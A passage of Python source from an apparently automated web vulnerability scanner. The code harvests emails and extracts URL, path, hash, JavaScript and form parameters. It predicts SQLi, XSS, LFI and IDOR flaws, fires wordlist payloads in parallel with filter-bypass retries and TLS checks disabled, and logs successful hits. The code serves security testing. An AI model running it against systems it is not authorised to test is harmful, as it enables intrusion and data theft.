            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
            self.results['emails'].extend(list(set(emails)))
            
            # EXTENDED PARAMETER ANALYSIS - IMMEDIATE TESTING
            parsed = urlparse(url)
            
            # 1. Traditional query parameters (?param=value)
            if parsed.query:
                self.analyze_url_parameters_immediately(url, response.text)
            
            # 2. Hash fragments (#!/route, #/user/123)
            if parsed.fragment:
                self.analyze_hash_fragments_immediately(url, parsed.fragment, response.text)
            
            # 3. Path segments (/product/123, /user/admin)
            self.analyze_path_segments_immediately(url, response.text)
            
            # 4. Dynamic JavaScript parameters (SPA routing, API calls)
            if js_content:
                self.analyze_dynamic_js_parameters_immediately(url, js_content, response.text)
            
            # 5. Enhanced form analysis (test inputs immediately)
            self.analyze_forms_immediately(soup, url, response.text)
            
        except requests.RequestException as e:
            logger.error(f"Error crawling {url}: {e}")
            if depth == 0 and 'timeout' in str(e).lower():
                try:
                    logger.info(f"Retrying {url} with longer timeout...")
                    response = self.session.get(url, timeout=30, verify=False)
                    self.crawl_page(url, depth)
                except:
                    pass
    
    def analyze_url_parameters_immediately(self, url, response_text):
        """Enhanced parameter analysis with behavioral fingerprinting"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if self.verbose:
            print(f"\n🔍 ANALYZING QUERY PARAMETERS: {url}")
        
        endpoint = {
            'url': url.split('?')[0],
            'method': 'GET',
            'parameters': [],
            'form': False,
            'source': 'query_parameters'
        }
        
        for param_name, values in params.items():
            param_value = values[0] if values else ''
            
            param_data = {
                'name': param_name,
                'location': 'query',
                'type': 'string',
                'value_sample': param_value,
                'predicted_vulns': []
            }
            
            # BEHAVIORAL ANALYSIS FIRST
            if self.verbose:
                print(f"\n  🧪 BEHAVIORAL FINGERPRINTING: {param_name}")
            
            behavioral_results = self.behavioral_engine.fingerprint_endpoint(
                self.session,
                endpoint['url'],
                param_name,
                rate_limiter=self.rate_limiter,  # Passa rate limiter globale
                parallel=True,  # Abilita parallelizzazione
                max_workers=5  # 5 probe in parallelo
            )
            
            # Store behavioral results
            self.results['behavioral_analysis_results'].append({
                'endpoint': endpoint['url'],
                'parameter': param_name,
                'results': behavioral_results
            })
            
            # Get behavioral predictions
            behavioral_vulns = self.behavioral_engine.predict_vulnerabilities(behavioral_results)
            
            # Traditional analysis
            traditional_vulns = self.param_analyzer.analyze_parameter(
                param_name, param_value, response_text
            )
            
            # Merge and prioritize vulnerabilities
            merged_vulns = self.merge_vulnerability_predictions(
                behavioral_vulns, 
                traditional_vulns,
                behavioral_results
            )
            
            if merged_vulns:
                if self.verbose:
                    print(f"  📍 Parameter '{param_name}' → predicted vulnerabilities:")
                    for vuln in merged_vulns:
                        confidence_level = self.get_confidence_level(vuln['confidence'])
                        print(f"    - {vuln['type'].upper()} ({confidence_level}): {vuln['evidence']}")
                        if 'behavioral_type' in vuln:
                            print(f"      🧬 Behavioral: {vuln['behavioral_type']}")
                
                for vuln in merged_vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, merged_vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
            if self.verbose:
                print(f"    ✅ Added endpoint with {len(endpoint['parameters'])} parameters")
    
    def merge_vulnerability_predictions(self, behavioral_vulns, traditional_vulns, behavioral_results):
        """Intelligently merge behavioral and traditional predictions"""
        merged = {}
        
        # Add behavioral predictions with boost
        for vuln in behavioral_vulns:
            key = vuln['type']
            merged[key] = vuln.copy()
            merged[key]['source'] = 'behavioral'
            merged[key]['behavioral_results'] = behavioral_results
        
        # Add or merge traditional predictions
        for vuln in traditional_vulns:
            key = vuln['type']
            if key in merged:
                # Boost confidence if both methods agree
                merged[key]['confidence'] = min(100, merged[key]['confidence'] + 15)
                merged[key]['evidence'] += f" + {vuln['evidence']}"
                merged[key]['source'] = 'both'
            else:
                merged[key] = vuln.copy()
                merged[key]['source'] = 'traditional'
        
        # Convert to list and sort by confidence
        result = list(merged.values())
        result.sort(key=lambda x: x['confidence'], reverse=True)
        
        return result
    
    def get_confidence_level(self, confidence):
        """Convert numeric confidence to human-readable level"""
        if confidence >= 90:
            return "CRITICAL confidence"
        elif confidence >= 75:
            return "HIGH confidence"
        elif confidence >= 50:
            return "MEDIUM confidence"
        elif confidence >= 25:
            return "LOW confidence"
        else:
            return "MINIMAL confidence"
    
    def analyze_hash_fragments_immediately(self, url, fragment, response_text):
        """Analyze hash fragments for SPA routing and injection points"""
        if self.verbose:
            print(f"\n📱 ANALYZING HASH FRAGMENT: {url}#{fragment}")
        
        # Common SPA routing patterns
        spa_patterns = [
            r'#!/([^/]+)(?:/([^/]+))*',  # Angular: #!/route/param
            r'#/([^/]+)(?:/([^/]+))*',   # React/Vue: #/route/param  
            r'#([^/]+)(?:/([^/]+))*'     # Generic hash routing
        ]
        
        extracted_params = []
        
        for pattern in spa_patterns:
            matches = re.findall(pattern, fragment)
            if matches:
                if isinstance(matches[0], tuple):
                    for match in matches:
                        for param in match:
                            if param and param not in extracted_params:
                                extracted_params.append(param)
                else:
                    for param in matches:
                        if param and param not in extracted_params:
                            extracted_params.append(param)
        
        # Also split by common separators
        fragment_parts = re.split(r'[#!/&=?]', fragment)
        for part in fragment_parts:
            if part and len(part) > 1 and part not in extracted_params:
                extracted_params.append(part)
        
        if not extracted_params:
            return
        
        if self.verbose:
            print(f"  📍 Extracted hash parameters: {extracted_params}")
        
        # Create endpoint for hash parameters
        endpoint = {
            'url': url,
            'method': 'GET',
            'parameters': [],
            'form': False,
            'source': 'hash_fragment'
        }
        
        for i, param_value in enumerate(extracted_params):
            param_name = f"hash_param_{i}"
            
            param_data = {
                'name': param_name,
                'location': 'hash',
                'type': 'string',
                'value_sample': param_value,
                'predicted_vulns': []
            }
            
            # Analyze the parameter value for vulnerability patterns
            vulns = self.param_analyzer.analyze_parameter(
                param_value, param_value, response_text
            )
            
            # Additional SPA-specific vulnerabilities
            if param_value.isdigit():
                vulns.append({
                    'type': 'idor',
                    'confidence': 60, 
                    'context': 'spa_id_param',
                    'evidence': f'ID-like parameter in SPA route: {param_value}'
                })
            
            # Check for route injection possibilities
            if any(keyword in param_value.lower() for keyword in ['admin', 'user', 'account', 'profile']):
                vulns.append({
                    'type': 'access_control',
                    'confidence': 35,
                    'context': 'spa_route_access',
                    'evidence': f'Sensitive route parameter: {param_value}'
                })
            
            if vulns:
                if self.verbose:
                    print(f"    - '{param_value}' → predicted vulnerabilities:")
                    for vuln in vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']} confidence): {vuln['evidence']}")
                
                for vuln in vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test hash parameter vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_path_segments_immediately(self, url, response_text):
        """Analyze URL path segments for injection points with behavioral analysis"""
        parsed = urlparse(url)
        path_segments = [seg for seg in parsed.path.split('/') if seg]
        
        if len(path_segments) < 2:  # Need at least some path structure
            return
        
        if self.verbose:
            print(f"\n🛣️ ANALYZING PATH SEGMENTS: {'/'.join(path_segments)}")
        
        # Identify potentially injectable segments
        injectable_segments = []
        
        for i, segment in enumerate(path_segments):
            # Numeric segments (IDs)
            if segment.isdigit():
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'numeric_id',
                    'name': f'path_id_{i}'
                })
            
            # Base64-like segments
            elif len(segment) > 10 and re.match(r'^[A-Za-z0-9+/=]+$', segment):
                injectable_segments.append({
                    'index': i, 
                    'value': segment,
                    'type': 'base64_like',
                    'name': f'path_b64_{i}'
                })
            
            # UUID-like segments
            elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', segment, re.I):
                injectable_segments.append({
                    'index': i,
                    'value': segment, 
                    'type': 'uuid',
                    'name': f'path_uuid_{i}'
                })
            
            # Alphanumeric tokens (session tokens, API keys)
            elif len(segment) > 8 and re.match(r'^[A-Za-z0-9]+$', segment):
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'token',
                    'name': f'path_token_{i}'
                })
            
            # Filenames with extensions
            elif '.' in segment and len(segment) > 3:
                injectable_segments.append({
                    'index': i,
                    'value': segment,
                    'type': 'filename',
                    'name': f'path_file_{i}'
                })
        
        # Filter out already tested path segments to avoid redundancy
        new_injectable_segments = []
        for seg in injectable_segments:
            seg_key = (seg['index'], seg['value'])
            if seg_key not in self.tested_path_segments:
                new_injectable_segments.append(seg)
                self.tested_path_segments.add(seg_key)
        
        if not new_injectable_segments:
            return
        
        if self.verbose:
            print(f"  📍 Injectable path segments found: {len(new_injectable_segments)}")
            for seg in new_injectable_segments:
                print(f"    - {seg['name']}: {seg['value']} ({seg['type']})")
        
        # Create endpoint for path segments
        endpoint = {
            'url': url,
            'method': 'GET', 
            'parameters': [],
            'form': False,
            'source': 'path_segments'
        }
        
        for segment_info in new_injectable_segments:
            param_data = {
                'name': segment_info['name'],
                'location': 'path',
                'type': segment_info['type'],
                'value_sample': segment_info['value'],
                'path_index': segment_info['index'],
                'predicted_vulns': []
            }
            
            # BEHAVIORAL ANALYSIS per path segments
            if self.verbose:
                print(f"\n  🧪 BEHAVIORAL FINGERPRINTING: {segment_info['name']} (path segment)")
            
            behavioral_results = self.behavioral_engine.fingerprint_path_segment(
                self.session,
                self.target_url,
                segment_info['index'],
                segment_info['value'],
                path_segments
            )
            
            # Store behavioral results
            self.results['behavioral_analysis_results'].append({
                'endpoint': url,
                'parameter': segment_info['name'],
                'type': 'path_segment',
                'results': behavioral_results
            })
            
            # Get behavioral predictions
            behavioral_vulns = []
            
            # Check if it's a static file
            file_behavior = behavioral_results.get('file_operations', {})
            static_behavior = behavioral_results.get('static_serving', {})
            
            if file_behavior.get('type') == 'static_file':
                # Static files - NO path traversal vulnerabilities
                if segment_info['value'].endswith('.css'):
                    behavioral_vulns.append({
                        'type': 'css_injection',
                        'confidence': 20,  # Low because most CSS is static
                        'evidence': 'CSS file detected - potential for CSS injection if dynamically generated'
                    })
            elif file_behavior.get('type') == 'dynamic_file_handler':
                # Dynamic file handling - potential vulnerabilities
                behavioral_vulns.extend([
                    {
                        'type': 'lfi',
                        'confidence': 75,
                        'evidence': f'Dynamic file handler detected for: {segment_info["value"]}',
                        'behavioral_type': 'dynamic_file_processing'
                    },
                    {
                        'type': 'path_traversal',
                        'confidence': 70,
                        'evidence': 'Server processes file paths dynamically',
                        'behavioral_type': 'dynamic_path_handling'
                    }
                ])
            
            # Traditional analysis only for non-static resources
            traditional_vulns = []
            if not (file_behavior.get('type') == 'static_file' or static_behavior.get('type') == 'static_resource'):
                # Original vulnerability assignment logic, but only for dynamic resources
                if segment_info['type'] == 'numeric_id':
                    traditional_vulns.extend([
                        {
                            'type': 'sqli',
                            'confidence': 60,
                            'context': 'path_numeric_id',
                            'evidence': f'Numeric ID in path: {segment_info["value"]}'
                        },
                        {
                            'type': 'idor',
                            'confidence': 85,
                            'context': 'path_id_access',
                            'evidence': f'Direct object reference in path: {segment_info["value"]}'
                        }
                    ])
                
                elif segment_info['type'] in ['base64_like', 'uuid', 'token']:
                    traditional_vulns.extend([
                        {
                            'type': 'idor',
                            'confidence': 60,
                            'context': 'path_token_access',
                            'evidence': f'Token-like parameter in path: {segment_info["value"][:20]}...'
                        },
                        {
                            'type': 'auth_bypass',
                            'confidence': 35,
                            'context': 'path_session_token',
                            'evidence': f'Potential session token in path'
                        }
                    ])
            
            # Merge predictions
            merged_vulns = self.merge_vulnerability_predictions(
                behavioral_vulns,
                traditional_vulns,
                behavioral_results
            )
            
            if merged_vulns:
                if self.verbose:
                    print(f"    📊 {segment_info['name']} vulnerabilities (after behavioral analysis):")
                    for vuln in merged_vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")
                
                for vuln in merged_vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, merged_vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_dynamic_js_parameters_immediately(self, url, js_content, response_text):
        """Analyze JavaScript for dynamic parameters and API calls"""
        if self.verbose:
            print(f"\n🔧 ANALYZING DYNAMIC JAVASCRIPT PARAMETERS")
        
        dynamic_params = []
        
        # Pattern 1: Angular/React route parameters
        route_patterns = [
            r'\$routeParams\.(\w+)',  # Angular $routeParams.id
            r'params\.(\w+)',         # React/Vue params.id
            r'useParams\(\)\.(\w+)',  # React hooks
            r'\$stateParams\.(\w+)',  # UI-Router
        ]
        
        for pattern in route_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                if match not in [p['name'] for p in dynamic_params]:
                    dynamic_params.append({
                        'name': match,
                        'source': 'spa_routing',
                        'pattern': pattern
                    })
        
        # Pattern 2: API endpoint parameters
        api_patterns = [
            r'fetch\(["\'].*?/(\w+)/(\w+)["\']',  # fetch('/users/123')
            r'axios\.[get|post|put|delete]\(["\'].*?/(\w+)["\']',  # axios.get('/user/123')
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                if isinstance(match, tuple):
                    for param in match:
                        if param and param.isdigit() and len(param) < 10:
                            dynamic_params.append({
                                'name': f'api_id_{param}',
                                'source': 'api_endpoint',
                                'value': param
                            })
        
        # Filter out already tested parameters to avoid loops/redundancy
        new_dynamic_params = []
        for p in dynamic_params:
            param_key = (p['source'], p['name'])
            if param_key not in self.tested_dynamic_params:
                new_dynamic_params.append(p)
                self.tested_dynamic_params.add(param_key)
        
        if not new_dynamic_params:
            return
        
        if self.verbose:
            print(f"  📍 Dynamic JavaScript parameters found: {len(new_dynamic_params)}")
            for param in new_dynamic_params:
                print(f"    - {param['name']} (source: {param['source']})")
        
        # Create endpoint for JavaScript parameters
        endpoint = {
            'url': url,
            'method': 'POST',  # Most dynamic params are POST
            'parameters': [],
            'form': False,
            'source': 'javascript_dynamic'
        }
        
        for param_info in new_dynamic_params:
            param_data = {
                'name': param_info['name'],
                'location': 'javascript',
                'type': 'dynamic',
                'source_type': param_info['source'],
                'predicted_vulns': []
            }
            
            # Predict vulnerabilities for dynamic parameters
            vulns = self.param_analyzer.analyze_parameter(
                param_info['name'], 
                param_info.get('value', ''), 
                response_text
            )
            
            # Add JavaScript-specific vulnerabilities
            if param_info['source'] == 'spa_routing':
                vulns.append({
                    'type': 'xss',
                    'confidence': 60,
                    'context': 'spa_dom_xss',
                    'evidence': f'SPA routing parameter susceptible to DOM XSS: {param_info["name"]}'
                })
            
            if vulns:
                if self.verbose:
                    print(f"    📊 {param_info['name']} vulnerabilities:")
                    for vuln in vulns:
                        print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")
                
                for vuln in vulns:
                    vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                        vuln['type'], self.results['technologies']
                    )
                    param_data['predicted_vulns'].append(vuln)
                
                # Test JavaScript parameter vulnerabilities immediately
                self.test_vulnerability_immediately(endpoint, param_data, vulns)
            
            endpoint['parameters'].append(param_data)
        
        if endpoint['parameters']:
            self.endpoints.append(endpoint)
    
    def analyze_forms_immediately(self, soup, url, response_text):
        """Enhanced form analysis with immediate testing"""
        forms = soup.find_all('form')
        if not forms:
            return
        
        if self.verbose:
            print(f"\n📝 ANALYZING FORMS: {len(forms)} found")
        
        for form_idx, form in enumerate(forms):
            action = urljoin(url, form.get('action', url))
            method = form.get('method', 'GET').upper()
            
            if self.verbose:
                print(f"  📋 Form {form_idx + 1}: {method} {action}")
            
            # Extract all form inputs
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'required': input_tag.get('required') is not None,
                    'placeholder': input_tag.get('placeholder', ''),
                    'id': input_tag.get('id', '')
                }
                
                if input_data['name']:
                    inputs.append(input_data)
            
            if not inputs:
                continue
            
            # Create endpoint for form
            endpoint = {
                'url': action,
                'method': method,
                'parameters': [],
                'form': True,
                'source': 'html_form'
            }
            
            for input_data in inputs:
                param_data = {
                    'name': input_data['name'],
                    'location': 'body',
                    'type': input_data['type'],
                    'required': input_data['required'],
                    'predicted_vulns': []
                }
                
                # Analyze form input for vulnerabilities
                vulns = self.param_analyzer.analyze_parameter(
                    input_data['name'], 
                    input_data['value'], 
                    response_text
                )
                
                # Add form-specific vulnerabilities
                if input_data['type'] == 'file':
                    vulns.append({
                        'type': 'file_upload',
                        'confidence': 85,
                        'context': 'file_upload_form',
                        'evidence': f'File upload input: {input_data["name"]}'
                    })

                # I parametri hidden NON sono vulnerabilità in sé stessi
                # Sono parametri che dovrebbero essere testati per vulnerabilità standard
                # (XSS, SQLi, etc.) come qualsiasi altro parametro
                # La logica di test è già gestita da param_analyzer.analyze_parameter()
                if input_data['type'] == 'hidden':
                    # Aumenta leggermente la priorità di test per parametri hidden
                    # perché spesso contengono dati sensibili (ID, prezzi, etc.)
                    for vuln in vulns:
                        if vuln.get('confidence', 0) < 70:
                            vuln['confidence'] = min(vuln['confidence'] + 15, 90)
                        vuln['context'] = vuln.get('context', '') + ' (hidden_field)'
                        vuln['evidence'] = vuln.get('evidence', '') + f' - Hidden parameter: {input_data["name"]}'
                
                if vulns:
                    if self.verbose:
                        print(f"    📍 Input '{input_data['name']}' ({input_data['type']}) vulnerabilities:")
                        for vuln in vulns:
                            print(f"      * {vuln['type'].upper()} ({vuln['confidence']}): {vuln['evidence']}")
                    
                    for vuln in vulns:
                        vuln['wordlists'] = self.wordlist_mapper.get_wordlists_for_vulnerability(
                            vuln['type'], self.results['technologies']
                        )
                        param_data['predicted_vulns'].append(vuln)
                    
                    # Test form input vulnerabilities immediately
                    self.test_vulnerability_immediately(endpoint, param_data, vulns)
                
                endpoint['parameters'].append(param_data)
            
            if endpoint['parameters']:
                self.endpoints.append(endpoint)
    
    def test_vulnerability_immediately(self, endpoint, param, vulnerabilities):
        """Test vulnerabilities immediately when found"""
        if not vulnerabilities:
            return

        param_name = param['name']
        endpoint_url = endpoint['url']

        if self.verbose:
            print(f"\n🎯 IMMEDIATE TESTING: {endpoint_url} parameter '{param_name}'")

        # Filtra le vulnerabilità già testate per questo parametro
        vulns_to_test = []
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', vuln.get('vulnerability', 'unknown'))
            confidence = vuln.get('confidence', 'unknown')

            # Verifica se questo parametro+vulnerabilità deve essere testato
            if self.should_test_parameter(param_name, vuln_type, endpoint_url):
                vulns_to_test.append(vuln)
            else:
                if self.verbose:
                    print(f"  ⏭️  Skipping {vuln_type.upper()} for '{param_name}' - already tested on similar endpoints")

        if not vulns_to_test:
            if self.verbose:
                print(f"  ℹ️  All vulnerabilities for '{param_name}' already tested - skipping")
            return

        for vuln in vulns_to_test:
            vuln_type = vuln.get('type', vuln.get('vulnerability', 'unknown'))
            confidence = vuln.get('confidence', 'unknown')

            if self.verbose:
                print(f"  🔍 Testing {vuln_type.upper()} (confidence: {confidence})")

            # Get appropriate wordlists (external)
            wordlists = self.wordlist_mapper.get_wordlists_for_vulnerability(
                vuln_type, self.results['technologies']
            )

            # Check if we have any payloads (external OR internal fallback)
            internal_payloads = self.wordlist_mapper.get_internal_payloads(vuln_type)

            if not wordlists and not internal_payloads:
                if self.verbose:
                    print(f"    ⚠️ No payloads available for {vuln_type} (no external wordlists or internal fallback)")
                # Marca come testato anche se non ci sono wordlist per evitare retry
                self.mark_parameter_tested(param_name, vuln_type, endpoint_url)
                continue

            # Test with payloads from wordlists (uses internal fallback if external empty)
            self.test_with_wordlists(endpoint, param, vuln_type, wordlists)

            # Marca come testato dopo il test
            self.mark_parameter_tested(param_name, vuln_type, endpoint_url)
    
    def test_with_wordlists(self, endpoint, param, vuln_type, wordlists):
        """
        Test vulnerability using wordlists and bypasses con lazy loading.

        Migliorie:
        - Lazy loading con itertools.islice (no caricamento file interi)
        - Payload validation per skippare payload invalidi
        - Rate limiting integrato
        - Performance monitoring
        - ⚠️ FALLBACK a payload interni se wordlist esterni non disponibili
        """
        tested_payloads = set()  # Per evitare duplicati
        max_payloads_per_list = 10  # Limit for immediate testing

        # Collect payloads con LAZY LOADING da file esterni
        all_payloads = []
        external_loaded = False

        for wordlist in wordlists[:3]:  # Limit to first 3 wordlists
            if not os.path.exists(wordlist['path']):
                continue

            try:
                with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                    # ⚡ LAZY LOADING: leggi solo i payload necessari, non tutto il file
                    payload_count = 0
                    for line in itertools.islice(f, max_payloads_per_list * 10):  # Max 100 lines per file
                        line = line.strip()
                        # Skippa commenti e righe vuote
                        if not line or line.startswith('#'):
                            continue

                        # ✅ PAYLOAD VALIDATION
                        if self._is_valid_payload(line):
                            all_payloads.append(line)
                            payload_count += 1
                            if payload_count >= max_payloads_per_list:
                                break

                if payload_count > 0:
                    external_loaded = True
                    if self.verbose:
                        print(f"    📚 Loaded {payload_count} payloads from: {wordlist['source']}/{wordlist['relative_path']}")

            except IOError as e:
                logger.error(f"IO error reading wordlist {wordlist['path']}: {e}")
                self.performance_monitor.increment_errors()
            except Exception as e:
                logger.error(f"Unexpected error reading wordlist {wordlist['path']}: {e}", exc_info=True)
                self.performance_monitor.increment_errors()
                continue

        # ⚠️ FALLBACK: se nessun wordlist esterno disponibile, usa payload interni
        if not all_payloads:
            internal_payloads = self.wordlist_mapper.get_internal_payloads(vuln_type)
            if internal_payloads:
                all_payloads = internal_payloads[:max_payloads_per_list * 2]
                if self.verbose:
                    print(f"    🔧 Using {len(all_payloads)} INTERNAL fallback payloads for {vuln_type.upper()}")
            else:
                if self.verbose:
                    print(f"    ⚠️ No payloads available for {vuln_type} (external or internal)")
                return

        # Sort and unique (sort | uniq)
        unique_payloads = sorted(list(set(all_payloads)))

        if self.verbose:
            source_type = "external" if external_loaded else "internal"
            print(f"    📊 Total unique payloads: {len(unique_payloads)} ({source_type})")

        # Limita payloads da testare
        payloads_to_test = unique_payloads[:max_payloads_per_list * 2]

        # ⚡ PARALLELIZZAZIONE PAYLOAD TESTING
        # Se abbiamo molti payload (>5), testa in parallelo
        if len(payloads_to_test) > 5:
            tested_count = self._test_payloads_parallel(
                endpoint, param, payloads_to_test, vuln_type, tested_payloads,
                max_workers=3  # 3 payload in parallelo
            )
        else:
            # SEQUENZIALE: per pochi payload
            tested_count = 0
            for payload in payloads_to_test:
                if tested_count >= max_payloads_per_list * 2:
                    break

                # ⚡ Rate limiting
                self.rate_limiter.wait()

                # Test without bypass first
                success = self.test_single_payload(endpoint, param, payload, vuln_type, None)

                if not success and self.bypass_manager and self.bypass_manager.validated_bypasses:
                    # Test with each validated bypass
                    for bypass in self.bypass_manager.validated_bypasses:
                        if self.verbose:
                            print(f"      🔧 Applying bypass: {bypass['type']}")

                        self.rate_limiter.wait()
                        success = self.test_single_payload(endpoint, param, payload, vuln_type, bypass)
                        if success:
                            break  # Stop trying bypasses once one works

                tested_count += 1
                tested_payloads.add(payload)

                # Incrementa contatore performance
                self.performance_monitor.increment_payloads()

        if self.verbose:
            print(f"    ✅ Tested {tested_count} unique payloads for {vuln_type}")

    def _test_payloads_parallel(self, endpoint, param, payloads, vuln_type, tested_payloads, max_workers=3):
        """
        Testa payload in parallelo usando ThreadPoolExecutor.

        Args:
            endpoint: Endpoint dictionary
            param: Parameter dictionary
            payloads: Lista di payload da testare
            vuln_type: Tipo di vulnerabilità
            tested_payloads: Set di payload già testati
            max_workers: Numero di thread paralleli

        Returns:
            Numero di payload testati
        """
        tested_count = 0

        def test_payload_wrapper(payload):
            """Wrapper per testare singolo payload (per ThreadPoolExecutor)"""
            # Rate limiting
            self.rate_limiter.wait()

            # Test without bypass first
            success = self.test_single_payload(endpoint, param, payload, vuln_type, None)

            # Se non ha successo, prova con bypass
            if not success and self.bypass_manager and self.bypass_manager.validated_bypasses:
                for bypass in self.bypass_manager.validated_bypasses:
                    self.rate_limiter.wait()
                    success = self.test_single_payload(endpoint, param, payload, vuln_type, bypass)
                    if success:
                        break  # Stop trying bypasses once one works

            # Incrementa contatore performance
            self.performance_monitor.increment_payloads()
            return payload, success

        # Esegui in parallelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Sottometti tutti i task
            future_to_payload = {
                executor.submit(test_payload_wrapper, payload): payload
                for payload in payloads
            }

            # Processa risultati man mano che completano
            for future in concurrent.futures.as_completed(future_to_payload):
                try:
                    payload, success = future.result()
                    tested_payloads.add(payload)
                    tested_count += 1

                    if success and self.verbose:
                        print(f"      ✅ Payload succeeded: {payload[:30]}...")
                except Exception as e:
                    logger.error(f"Error in parallel payload testing: {e}", exc_info=True)
                    self.performance_monitor.increment_errors()

        return tested_count

    def _is_valid_payload(self, payload):
        """
        Valida un payload prima di testarlo.

        Skippa:
        - Payload vuoti o troppo lunghi (>10k)
        - Payload con caratteri non-printable
        - Payload già testati (hash check)

        Returns:
            True se payload è valido, False altrimenti
        """
        # Controllo lunghezza
        if not payload or len(payload) > 10000:
            return False

        # Controllo caratteri printable (permetti alcuni caratteri speciali comuni)
        # Permettiamo: lettere, numeri, spazi, punteggiatura comune, newline, tab
        try:
            # Verifica se contiene troppi caratteri non-ASCII o control characters
            non_printable = sum(1 for c in payload if ord(c) < 32 and c not in '\n\r\t')
            if non_printable > len(payload) * 0.3:  # Max 30% caratteri non-printable
                return False
        except:
            return False

        # Controllo duplicati via hash
        payload_hash = hashlib.md5(payload.encode('utf-8', errors='ignore')).digest()
        if payload_hash in self.tested_payloads_hash:
            return False

        # Aggiungi hash al set
        self.tested_payloads_hash.add(payload_hash)

        # Limita dimensione hash set per evitare OOM
        if len(self.tested_payloads_hash) > 50000:
            # Rimuovi metà dei vecchi hash (approccio semplice)
            self.tested_payloads_hash = set(list(self.tested_payloads_hash)[25000:])

        return True
    
    def test_single_payload(self, endpoint, param, payload, vuln_type, bypass=None):
        """
        Test a single payload against an endpoint.

        Migliorie:
        - Rate limiting integrato
        - Performance monitoring
        - Error handling migliorato con eccezioni specifiche
        - Response cleanup automatico
        """
        response = None
        try:
            # Build test URL
            base_url = endpoint['url']
            param_name = param['name']

            # Determine how to inject payload
            if endpoint.get('method', 'GET').upper() == 'GET':
                # GET request - add to URL parameters
                separator = '&' if '?' in base_url else '?'
                test_url = f"{base_url}{separator}{param_name}={urllib.parse.quote(payload)}"
            else:
                # POST request - would need form data
                test_url = base_url

            # Apply bypass if provided
            if bypass:
                request_params = self.bypass_manager.apply_bypass_to_request(
                    test_url, bypass, payload, endpoint.get('method', 'GET')
                )
                if not request_params:
                    return False
            else:
                request_params = {
                    'url': test_url,
                    'method': endpoint.get('method', 'GET'),
                    'timeout': 5,
                    'verify': False,
                    'allow_redirects': True
                }

            # ⚡ Rate limiting
            self.rate_limiter.wait()

            # Make request con error handling specifico
            try:
                if request_params['method'].upper() == 'GET':
                    response = self.session.get(
                        request_params['url'],
                        headers=request_params.get('headers'),
                        timeout=request_params['timeout'],
                        verify=request_params['verify'],
                        allow_redirects=request_params['allow_redirects']
                    )
                else:
                    response = self.session.post(
                        request_params['url'],
                        headers=request_params.get('headers'),
                        data=request_params.get('data'),
                        timeout=request_params['timeout'],
                        verify=request_params['verify'],
                        allow_redirects=request_params['allow_redirects']
                    )

                # Incrementa contatore HTTP requests
                self.performance_monitor.increment_requests()

            except requests.Timeout:
                logger.warning(f"Timeout testing payload on {base_url}")
                self.performance_monitor.increment_errors()
                return False
            except requests.ConnectionError as e:
                logger.warning(f"Connection error testing payload on {base_url}: {e}")
                self.performance_monitor.increment_errors()
                return False
            except requests.RequestException as e:
                logger.error(f"Request error testing payload on {base_url}: {e}")
                self.performance_monitor.increment_errors()
                return False
            
            # Analyze response for vulnerability indicators
            vulnerability_detected = self.analyze_response_for_vulnerability(
                response, payload, vuln_type, bypass
            )
            
            if vulnerability_detected:
                # Incrementa contatore vulnerabilità
                self.performance_monitor.increment_vulnerabilities()

                # Record successful test
                test_result = {
                    'endpoint': endpoint['url'],
                    'parameter': param_name,
                    'vulnerability_type': vuln_type,
                    'payload': payload,
                    'bypass_used': bypass['type'] if bypass else None,
                    'response_status': response.status_code,
                    'response_length':  len(response.content),
                    'timestamp': time.strftime('%H:%M:%S'),
                    'confidence': 85 if bypass else 75
                }

                self.results['vulnerability_test_results'].append(test_result)

                # ✅ SALVA IMMEDIATAMENTE SU FILE CON TUTTI I DETTAGLI
                self.vuln_logger.log_vulnerability(
                    endpoint=endpoint['url'],
                    parameter=param_name,
                    payload=payload,
                    vulnerability_type=vuln_type,  # XSS, SQLI, LFI, RCE, etc.
                    bypass_used=bypass['type'] if bypass else None,
                    response_status=response.status_code,
                    response_length=len(response.content),
                    method=request_params['method'],  # Passa il metodo reale utilizzato
                    headers=dict(response.request.headers),  # Usa gli header della richiesta effettiva
                    confidence=85 if bypass else 75
                )

                if self.verbose:
                    bypass_info = f" with {bypass['type']}" if bypass else ""
                    print(f"      🚨 VULNERABILITY DETECTED{bypass_info}!")
